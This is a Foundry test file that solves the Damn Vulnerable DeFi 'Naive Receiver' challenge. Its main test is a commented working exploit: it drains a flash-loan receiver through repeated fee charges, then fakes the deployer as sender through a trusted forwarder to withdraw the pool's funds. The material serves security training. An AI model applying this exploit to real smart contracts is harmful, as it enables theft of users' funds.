// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    // Pool holds 1000 WETH; receiver holds 10 WETH
    // Each flashloan charges a flat 1 ETH fee regardless of loan amount,
    // so 10 flashloans with amount=0 will drain the receiver's 10 WETH entirely
    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;  // EIP-712 meta-transaction forwarder

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        weth = new WETH();

        // BasicForwarder allows meta-transactions: a third party submits a
        // signed request on behalf of another address (the player here)
        forwarder = new BasicForwarder();

        // Pool accepts ETH on deployment and wraps it to WETH internally.
        // deployer is registered as feeReceiver — critical for the withdrawal exploit
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Receiver auto-accepts flashloans from the pool; it cannot refuse them,
        // making it vulnerable to having its balance drained via repeated fee charges
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether); // flat 1 ETH fee always applies
        assertEq(pool.feeReceiver(), deployer);

        // onFlashLoan is only callable by the pool itself, not arbitrary addresses
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth),
            WETH_IN_RECEIVER,
            1 ether,
            bytes("")
        );
    }

    /**
     * ATTACK OVERVIEW
     * ═══════════════
     * There are two vulnerabilities chained together:
     *
     * 1. NAIVE RECEIVER (fee drain)
     *    FlashLoanReceiver blindly accepts any flashloan initiated by anyone,
     *    not just its own owner. Each loan charges a flat 1 ETH fee. By calling
     *    flashLoan() 10 times with amount=0, we drain the receiver's 10 WETH
     *    entirely into the pool (as accumulated fees), without spending anything.
     *
     * 2. TRUSTED FORWARDER + msg.sender SPOOFING (unauthorized withdrawal)
     *    NaiveReceiverPool reads the "real" sender by checking the last 20 bytes
     *    of calldata when the call comes via the trusted forwarder. We exploit
     *    this by appending the deployer's address to the withdraw() calldata.
     *    The pool then treats deployer as msg.sender, authorizing a full withdrawal
     *    since deployer is the registered feeReceiver.
     *
     * Everything is wrapped in a single multicall and submitted as one
     * meta-transaction through the forwarder, satisfying the ≤2 tx constraint.
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        // 11 calls total: 10 fee-drain flashloans + 1 spoofed withdrawal
        bytes[] memory callDatas = new bytes[](11);

        // ── STEP 1: Drain FlashLoanReceiver via fee accumulation ─────────────
        // Loan amount is 0, but the pool still charges the flat 1 ETH fee each time.
        // After 10 iterations the receiver's 10 WETH is fully transferred to the pool.
        for (uint i = 0; i < 10; i++) {
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan,
                (receiver, address(weth), 0, "0x")
            );
        }

        // ── STEP 2: Spoof deployer identity to authorize withdrawal ──────────
        // NaiveReceiverPool checks: if (msg.sender == trustedForwarder && data.length >= 20)
        //     sender = address(bytes20(data[data.length-20:]))
        // By appending deployer's address as raw bytes after the ABI-encoded call,
        // the pool reads it as msg.sender and grants deployer-level permissions.
        // This lets us call withdraw() as if we were the feeReceiver (deployer).
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            bytes32(uint256(uint160(deployer)))  // appended as the spoofed sender
        );

        // ── STEP 3: Bundle into one atomic multicall ─────────────────────────
        // All 11 operations execute in a single call, ensuring the receiver drain
        // completes before the withdrawal and that it counts as ≤2 player txs.
        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

        // ── STEP 4: Build EIP-712 meta-transaction request ───────────────────
        // BasicForwarder verifies a signed request and forwards it to the target
        // contract. This lets the player submit one on-chain tx (forwarder.execute)
        // while appearing as the legitimate signer inside the pool's logic.
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,                     // from:     address whose signature is verified
            address(pool),              // to:       contract that receives the forwarded call
            0,                          // value:    no ETH attached
            gasleft(),                  // gas:      pass all remaining gas
            forwarder.nonces(player),   // nonce:    prevents signature replay attacks
            multicallData,              // data:     the full multicall payload
            1 days                      // deadline: signature expires after 1 day
        );

        // ── STEP 5: Sign the request (EIP-712 typed data) ────────────────────
        // Hash = keccak256(0x1901 || domainSeparator || structHash)
        // The forwarder will ecrecover this hash and confirm it matches `request.from`
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",                     // EIP-191 version byte for typed structured data
                forwarder.domainSeparator(),     // binds the signature to this specific forwarder contract
                forwarder.getDataHash(request)  // deterministic hash of the Request struct fields
            )
        );

        // Sign with player's private key; vm.sign returns the (v, r, s) ECDSA components
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);

        // Forwarder expects signature packed as r ++ s ++ v (65 bytes total)
        bytes memory signatures = abi.encodePacked(r, s, v);

        // ── STEP 6: Execute — one transaction, full attack ───────────────────
        // forwarder verifies signature → calls pool.multicall(callDatas) →
        //   [10x] flashLoan drains receiver → withdraw() moves everything to recovery
        forwarder.execute(request, signatures);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertLe(vm.getNonce(player), 2);
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
